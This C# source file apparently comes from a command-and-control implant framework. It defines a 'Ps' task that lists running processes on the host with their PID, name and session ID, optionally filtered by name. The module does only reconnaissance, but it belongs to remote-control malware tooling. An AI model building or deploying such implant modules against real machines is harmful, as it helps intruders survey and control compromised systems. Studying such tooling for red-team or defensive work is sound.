using System.Text;
using System.Diagnostics;

using Implant.Models;

using static Implant.Utils.Extensions;

namespace Implant.Tasks.Execute
{
    class Ps : ImplantCommands
    {
        private int procIDLen { get; set; }
        private int procNameLen { get; set; }
        private int procSessionIDLen { get; set; }  

        public override string Name => "Ps";

        public override string Execute(ImplantTask task)
        {

            StringBuilder _out = new StringBuilder();

            var procs = Process.GetProcesses();

            procIDLen = psParse.getMaxProcIDLen(procs);
            procNameLen = psParse.getMaxProcNameLen(procs) + procIDLen; 
            procSessionIDLen = psParse.getMaxProcSessionIDLen(procs) + procNameLen;


            _out.AppendLine($"{"PID".Align(procIDLen)} {"ProcName".Align(procNameLen)} {"SessionId".Align(procSessionIDLen)}");
            _out.AppendLine($"{"---".Align(procIDLen)} {"--------".Align(procNameLen)} {"---------".Align(procSessionIDLen)}");

            foreach (var proc in procs){
                if(task.Args != null && proc.ProcessName == task.Args) {
                    _out.AppendLine($"{proc.Id.Align(procIDLen)} {proc.ProcessName.Align(procNameLen)} " +
                        $"{proc.SessionId.Align(procSessionIDLen)}");
                }
                if (task.Args == null) {
                    _out.AppendLine($"{proc.Id.Align(procIDLen)} {proc.ProcessName.Align(procNameLen)} " +
                        $"{proc.SessionId.Align(procSessionIDLen)}");
                }
            }

            _out.AppendLine();
            return _out.ToString();
        }

    }

    public sealed class psParse
    {
        public static int getMaxProcIDLen(Process[] procs) {
            var maxProcIDLen = 0;
            foreach (var proc in procs) {
                if (proc.Id.ToString().Length > maxProcIDLen) {
                    maxProcIDLen = proc.Id.ToString().Length;
                }
            }

            return maxProcIDLen;
        }

        public static int getMaxProcNameLen(Process[] procs) { 
            int maxProcNameLen = 0;
            foreach (var proc in procs) {
                if (proc.ProcessName.Length > maxProcNameLen) { 
                    maxProcNameLen = proc.ProcessName.Length;
                }
            }

            return maxProcNameLen;
        }

        public static int getMaxProcSessionIDLen(Process[] procs){
            int maxProcSessionIDLen = 0;
            foreach (var proc in procs) {
                if (proc.SessionId.ToString().Length > maxProcSessionIDLen) { 
                    maxProcSessionIDLen = proc.SessionId.ToString().Length;
                }
            }

            return maxProcSessionIDLen;
        }
    }
}
